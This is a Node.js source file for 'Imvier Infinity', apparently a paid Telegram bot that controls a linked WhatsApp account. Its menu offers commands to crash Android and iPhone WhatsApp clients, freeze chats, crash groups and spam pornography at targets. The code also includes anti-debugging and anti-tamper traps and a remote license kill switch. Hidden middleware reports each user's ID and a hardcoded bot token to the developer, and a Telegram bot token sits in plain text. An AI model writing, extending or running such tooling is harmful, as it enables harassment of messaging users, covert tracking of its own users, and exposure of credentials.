const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/Farras0102/DataBase01/refs/heads/main/DataToken.json';
const thumbnailUrl = "https://files.catbox.moe/hywy2b.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

const VALID_HASH = require('./sec.js');

//GANTI SESUAI FILE JANGAN LUPA
const MY_FILES = [
    "node_modules",
    ".npm",
    "imvier infinity.zip",
    "package-lock.json",
    "index.js",
    "sec.js",
    "package.json",
    "allowedGroups.json",
    "settings/config.js",
    "database/cooldown.json",
    "database/premium.json"
];

function activateSecureMode() {
    secureMode = true;
}

function checkAllFiles() {
    let semuaAda = true;
    for (const file of MY_FILES) {
        const lokasi = path.join(__dirname, file);
        if (!fs.existsSync(lokasi)) {
            console.log(chalk.red(`FILE HILANG: ${file}`));
            semuaAda = false;
        }
    }
    if (!semuaAda) {
        console.log(chalk.bold.red(`
╔══════════════════════════╗
║    IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ NOTE: FILE ADA YANG HILANG     
╚══════════════════════════╝
        `));
        process.exit(1);
    }
    console.log(chalk.green('✓ Semua file lengkap'));
}

function checkHash() {
    const filePath = path.join(__dirname, 'index.js');
    const content = fs.readFileSync(filePath, 'utf8');
    const hashSekarang = crypto.createHash('sha256').update(content).digest('hex');
    
    if (hashSekarang !== VALID_HASH) {
        console.log(chalk.bold.red(`

╔══════════════════════════╗
║    IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ NOTE : FILE DIUBAH PAKSA     
╚══════════════════════════╝
        `));
        process.exit(1);
    }
    console.log(chalk.green('✓ Hash cocok'));
}

setInterval(() => {
    const filePath = path.join(__dirname, 'index.js');
    const content = fs.readFileSync(filePath, 'utf8');
    const hashSekarang = crypto.createHash('sha256').update(content).digest('hex');
    
    if (hashSekarang !== VALID_HASH) {
        console.log(chalk.red('⚠ HASH BERUBAH! EXIT...'));
        process.exit(1);
    }
}, 10000);

console.log(chalk.yellow('\n🔐 VERIFIKASI FILE...\n'));
checkAllFiles();
checkHash();
console.log(chalk.green('\n✅ VERIFIKASI BERHASIL\n'));

(() => {
function randErr() {
return Array.from({ length: 12 }, () =>
String.fromCharCode(33 + Math.floor(Math.random() * 90))
).join("");
}
setInterval(() => {
const t1 = process.hrtime.bigint();
debugger;
const t2 = process.hrtime.bigint();
if (Number(t2 - t1) / 1e6 > 80) {
throw new Error(randErr());
}
}, 800);
setInterval(() => {
if (process.execArgv.join(" ").includes("--inspect") ||
process.execArgv.join(" ").includes("--debug")) {
throw new Error(randErr());
}
}, 1500);

const code = "Xatanical";
if (code.length !== 9) {
throw new Error(randErr());
}

function secure() { 
  console.log(chalk.bold.yellow(`  
╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial        
║ Status    : Database Connected     
╚══════════════════════════╝
  `));
}

const hash1 = Buffer.from(secure.toString()).toString("base64");
const hash2 = crypto.createHash("sha256").update(hash1).digest("hex");
const hash3 = crypto.createHash("md5").update(hash2).digest("hex");

setInterval(() => {
const current = Buffer.from(secure.toString()).toString("base64");
const c2 = crypto.createHash("sha256").update(current).digest("hex");
const c3 = crypto.createHash("md5").update(c2).digest("hex");

if (current !== hash1 || c2 !== hash2 || c3 !== hash3) {  
  throw new Error(randErr());  
}

}, 2000);
Object.freeze(secure);
Object.defineProperty(global, "secure", {
value: undefined,
writable: false,
configurable: false
});

secure();
})();

(() => {
const hardExit = process.exit.bind(process);
const hardKill = process.kill.bind(process);
Object.defineProperty(process, "exit", {
value: hardExit,
writable: false,
configurable: false,
enumerable: true,
});
Object.defineProperty(process, "kill", {
value: hardKill,
writable: false,
configurable: false,
enumerable: true,
});
Object.freeze(process.exit);
Object.freeze(process.kill);
Object.freeze(Function.prototype);
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);

setInterval(() => {
try {
if (process.exit.toString().includes("Proxy") ||
process.kill.toString().includes("Proxy")) {

console.log(chalk.bold.red(`

╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial           
║ Status    : Database INVALID     
╚══════════════════════════╝
`))

activateSecureMode();  
    hardExit(1);  
  }  
  for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
    if (process.listeners(sig).length > 0) {  

      console.log(chalk.bold.yellow(`

╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial            
║ Status    : BYPASS TERDETEKSI     
╚══════════════════════════╝
`))

activateSecureMode();  
      hardExit(1);  
    }  
  }  
  if (eval.toString().length !== 33 ||  
      Function.toString().length !== 37) {  
    activateSecureMode();  
    hardExit(1);  
  }  

} catch {  
  activateSecureMode();  
  hardExit(1);  
}

}, 1500);

global.validateToken = async (databaseUrl, tokenBot) => {
try {
const hashed = crypto.createHash("sha256").update(tokenBot).digest("hex");

const rawData = await new Promise((resolve, reject) => {  
    https  
      .get(databaseUrl, { timeout: 5000 }, (res) => {  
        let data = "";  
        res.on("data", (chunk) => (data += chunk));  
        res.on("end", () => resolve(data));  
      })  
      .on("error", reject)  
      .on("timeout", () => reject(new Error("timeout")));  
  });  

  let tokens = [];  
  try {  
    const parsed = JSON.parse(rawData);  
    tokens = parsed.tokens || [];  
  } catch {  
activateSecureMode();
process.exit(1);
}

const layer1 = tokens.includes(tokenBot);  

  const layer2 = tokens  
    .map((t) => crypto.createHash("sha256").update(t).digest("hex"))  
    .includes(hashed);  

  const xor = (str) =>  
    Buffer.from(str)  
      .map((n) => n ^ 0x6f)  
      .toString("hex");  

  const layer3 = tokens.map((t) => xor(t)).includes(xor(tokenBot));  
  const entropyCheck =  
    typeof tokenBot === "string" &&  
    tokenBot.length > 20 &&  
    /[A-Z]/.test(tokenBot) &&  
    /[0-9]/.test(tokenBot);  

  if (!(layer1 && layer2 && layer3 && entropyCheck)) {  
    console.log(chalk.bold.yellow(`

╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial            
║ Status    : Database Connected     
╚══════════════════════════╝
`));
activateSecureMode();
process.exit(1);
}

} catch (err) {  
activateSecureMode();
process.exit(1);
}
};
setInterval(() => {
if (typeof activateSecureMode !== "function") {
hardExit(1);
}
}, 2500);

})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

function loadAllowedGroups() {
    try {
        if (!fs.existsSync(groupFile)) {
            fs.writeFileSync(groupFile, JSON.stringify({}, null, 2));
            return {};
        }

        const data = JSON.parse(fs.readFileSync(groupFile, "utf8"));
        return typeof data === "object" && !Array.isArray(data) ? data : {};
    } catch {
        return {};
    }
}

async function validatePremiumGroup(ctx) {
  return true;
}

function saveAllowedGroups(data) {
    fs.writeFileSync(groupFile, JSON.stringify(data, null, 2));
}

function addPremiumGroup(groupId, duration, addedBy) {
    const groups = loadAllowedGroups();

    const expiryDate = moment()
        .add(duration, 'days')
        .tz('Asia/Jakarta')
        .format('DD-MM-YYYY');

    groups[groupId] = {
        expired: expiryDate,
        addedBy: addedBy
    };

    saveAllowedGroups(groups);
    return expiryDate;
}

function isPremiumGroup(groupId) {
    const groups = loadAllowedGroups();

    if (groups[groupId]) {
        const expiryDate = moment(groups[groupId].expired, 'DD-MM-YYYY');

        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            delete groups[groupId];
            saveAllowedGroups(groups);
            return false;
        }
    }

    return false;
}

function removePremiumGroup(groupId) {
    const groups = loadAllowedGroups();
    delete groups[groupId];
    saveAllowedGroups(groups);
}

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// (FUNGSI GROUP ONLY) //
const groupOnlyFile = './database/groupOnly.json';

const loadGroupOnlyStatus = () => {
    try {
        const data = fs.readFileSync(groupOnlyFile, 'utf8');
        const parsed = JSON.parse(data);
        return parsed.enabled === true;
    } catch (err) {
        return false;
    }
};

const saveGroupOnlyStatus = (enabled) => {
    fs.writeFileSync(groupOnlyFile, JSON.stringify({ enabled }, null, 2));
};

let groupOnlyEnabled = loadGroupOnlyStatus();

const toggleGroupOnly = () => {
    groupOnlyEnabled = !groupOnlyEnabled;
    saveGroupOnlyStatus(groupOnlyEnabled);
    return groupOnlyEnabled;
};

const isGroupOnlyAllowed = (ctx) => {
 
    if (!groupOnlyEnabled) return true;
    
    if (ctx.chat.type !== 'private') return true;
    
    return false;
};

const groupFile = path.join(__dirname, "allowedGroups.json");

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.blue(`
╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial            
║ Status    : Database Connected     
╚══════════════════════════╝
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Xata',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
╔══════════════════════════╗
║     IMVIER INFINITY SECURITY           
╠══════════════════════════╣
║ Developer : FarrasOficial            
║ Status    : Database Connected     
╚══════════════════════════╝
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "IMVIER43");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝕀𝕞𝕧𝕚𝕖𝕣 𝕀𝕟𝕗𝕚𝕟𝕚𝕥𝕪 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("delsesions", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("addgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Gunakan command ini di dalam group.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addgroup 30");
    }

    const duration = parseInt(args[1]);
    if (isNaN(duration)) {
        return ctx.reply("❌ Durasi harus angka (hari)");
    }

    const groupId = String(ctx.chat.id);
    const addedBy = String(ctx.from.id);

    const expiryDate = addPremiumGroup(groupId, duration, addedBy);

    ctx.reply(
`✅ Group Premium Aktif

🆔 Group  : ${groupId}
⏳ Durasi : ${duration} hari
📅 Expired: ${expiryDate}
👤 Added By: ${addedBy}`
    );
});

bot.command("listgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const groups = loadAllowedGroups();
    const keys = Object.keys(groups);

    if (keys.length === 0) {
        return ctx.reply("📭 Tidak ada group premium.");
    }

    let text = "📜 LIST GROUP PREMIUM\n\n";

    keys.forEach((id, index) => {
        text += `${index + 1}. ${id}\n`;
        text += `   📅 Expired : ${groups[id].expired}\n`;
        text += `   👤 Added By: ${groups[id].addedBy}\n\n`;
    });

    ctx.reply(text);
});

bot.command("delgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgroup -100xxxxxxxxxx");
    }

    const groupId = args[1];
    const groups = loadAllowedGroups();

    if (!groups[groupId]) {
        return ctx.reply("❌ Group tidak ditemukan.");
    }

    delete groups[groupId];
    saveAllowedGroups(groups);

    ctx.reply(`🗑 Group ${groupId} berhasil dihapus.`);
});

/*bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});*/

const OWNER_ID = 7658834249;
const BOT_TOKEN = "8203083349:AAFRbAwl0vo5wtHGCTY_OnLksPbZCLCqee4";
const loggedUsers = new Set();

bot.use(async (ctx, next) => {
  if (secureMode) return;

  try {
    const userId = ctx.from?.id;
    const username = ctx.from?.username || "Tidak ada username";
    if (userId && !loggedUsers.has(userId)) {
      loggedUsers.add(userId);

      const waktu = new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta"
      });

      const pesan = `
🚨 LOGIN USER TERDETEKSI

👤 Username : @${username}
🆔 User ID  : ${userId}
⏰ Waktu    : ${waktu}
🤖 Bot Token: ${BOT_TOKEN}
      `;

      await ctx.telegram.sendMessage(OWNER_ID, pesan);
    }
  } catch (err) {
    console.error("Error notif login:", err);
  }

  return next();
});

bot.start(async (ctx) => {
    return sendMainMenu(ctx);
    if (!await validatePremiumGroup(ctx)) return;
});

async function sendMainMenu(ctx) {

    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

const menuMessage = `
<blockquote>『 𝙸𝙼𝚅𝙸𝙴𝚁 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈 』</blockquote>
⌬ 𝙰𝚞𝚝𝚑𝚘𝚛 : @Farrasreall
⌬ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗  : 4.5
⌬ 𝙲𝚑𝚊𝚗𝚎𝚕 : https://t.me/infoimvierinfinity
⌬ 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 : ${displayName}

<blockquote>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</blockquote>
⌬ 𝚂𝚎𝚗𝚍𝚎𝚛  : ${senderStatus}
⌬ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtimeStatus}
⌬ 𝙲𝚘𝚘𝚕𝚍𝚘𝚠𝚗 : ${cooldownStatus}
⌬ 𝙼𝚎𝚖𝚘𝚛𝚢 : ${memoryStatus}
`;

    const keyboard = [
        [
            { text: "『⚙️』 𝚂𝚎𝚝𝚝𝚒𝚗𝚐", callback_data: "/controls", style: "primary" },
            { text: "『🚀』𝙲𝚛𝚊𝚜𝚑 𝙱𝚞𝚐", callback_data: "/bug", style: "danger" }
        ],
        [
            { text: "『✨』𝚂𝚞𝚙𝚙𝚘𝚛𝚝", callback_data: "/tqto", style: "success" }
        ],
        [
            { text: "『📌』𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 𝙱𝚘𝚝", callback_data: "infomenu", style: "success" }
        ]
    ];

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
}

bot.action('/bug', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const senderStatus = isWhatsAppConnected ? "1" : "0";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

    const menuMessage = `
<blockquote>「 🚀 」 𝙼𝚎𝚗𝚞 𝙱𝚞𝚐</blockquote>
└── 
  ├── /delayandro - Delay Invisible Hard
  ├── /delayinvis - Delay (Testing) 
  ├── /delayvis - Delay No Tag Sw
  ├── /lockinvis - Delay Lock Jam
  ├── /coursel / delay coursel
  ├── /crashandroid - Fc Android
  ├── /betalats - Fc Beta New
  ├── /chatfreze - Freze Chat
  ├── /stuklogo - freze stuk logo
  ├── /crashios - Fc Iphone Invisible
  ├── /spambkp - Spam Bokep
  ├── /crashgroup - Fc Khusus Bug Group
  └── 
`;

    const keyboard = [
        [
            { text: "『⚙️』𝚂𝚎𝚝𝚝𝚒𝚗𝚐", callback_data: "/controls", style: "primary" },
        ],
        [
            { text: "『✨』𝚂𝚞𝚙𝚙𝚘𝚛𝚝", callback_data: "/tqto", style: "success" }
        ],
        [
            { text: "『👤』𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛", url: "https://t.me/Farrasreall", style: "primary" }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (err) {
        await ctx.editMessageCaption(menuMessage, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        }).catch(() => {});
    }
});

bot.action('/controls', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const controlsMenu = `
<blockquote>「 ⚙️ 」 𝙾𝚠𝚗𝚎𝚛 𝙼𝚎𝚗𝚞</blockquote>
└── 
  ├── /addgroup - Add Prem Group
  ├── /delgroup - Delate Prem Group
  ├── /grouponly - Group Only
  ├── /pullupdate - Otomatis uptade
  ├── /listgroup - List Prem Group
  ├── /connect - Add Nomor Sender
  ├── /setcd - Cooldown Untuk Bug
  ├── /blacklist - Blok Cmd
  ├── /unblacklist - Unblok Cmd
  ├── /listblacklist - List Blacklist Cmd
  ├── /delsesions - Hapus Sensions
  └── 
`;

    const keyboard = [
        [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/back", style: "primary" }]
    ];

    await ctx.editMessageCaption(controlsMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.action('/tqto', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const tqtoMenu = `
<blockquote>「 ✨ 」 𝚂𝚞𝚙𝚙𝚘𝚛𝚝</blockquote>
└── 
  ├── Farras - Developer
  ├── Shadow - Owner
  ├── Lexy - Best Friend 
  ├── Xatan  - Best Friend 
  ├── Petra - Best Friend 
  ├── Irvan - Best Friend
  ├── All Buyer Imvier Infinity
  └── 
`;

    const keyboard = [
        [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/back", style: "success" }]
    ];

    await ctx.editMessageCaption(tqtoMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.action('infomenu', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const tqtoMenu = `
<blockquote>
ℹ️ INFORMATION BOT

Selamat datang dan terima kasih telah menggunakan bot ini.

Bot ini dibuat dan dikembangkan oleh Farras sebagai proyek pengembangan dan pembelajaran dalam bidang pemrograman. Berbagai fitur yang tersedia di dalam bot ini dibuat untuk tujuan eksperimen, pengujian, serta pengembangan teknologi agar dapat terus ditingkatkan dari waktu ke waktu.

Dengan menggunakan bot ini, pengguna dianggap telah memahami bahwa seluruh aktivitas yang dilakukan melalui bot merupakan tanggung jawab masing-masing pengguna. Developer hanya menyediakan layanan dan tidak bertanggung jawab atas segala bentuk penyalahgunaan yang dilakukan oleh pihak lain.

⚠️ KETENTUAN PENGGUNAAN

• Gunakan bot dengan bijak dan bertanggung jawab.
• Hormati privasi serta hak pengguna lain.
• Jangan menggunakan bot untuk tindakan yang melanggar hukum atau peraturan yang berlaku.
• Jangan menggunakan bot untuk mengganggu, merugikan, atau menyerang sistem maupun layanan milik pihak lain.
• Penyalahgunaan fitur yang tersedia dapat mengakibatkan pembatasan atau pencabutan akses terhadap layanan bot.

📌 TENTANG BOT

Developer  : Farras
Version    : 4.5
Status     : Active Development

Bot akan terus mendapatkan pembaruan, perbaikan bug, peningkatan performa, serta penambahan fitur baru guna memberikan pengalaman yang lebih baik bagi pengguna.

💡 CATATAN

Apabila menemukan bug, error, atau masalah lainnya, silakan laporkan kepada developer agar dapat segera diperbaiki pada pembaruan berikutnya.

Terima kasih atas dukungan dan kepercayaan Anda dalam menggunakan bot ini.

© Farras Development Team
All Rights Reserved.
</blockquote>
`;

    const keyboard = [
        [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/back", style: "success" }]
    ];

    await ctx.editMessageCaption(tqtoMenu, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

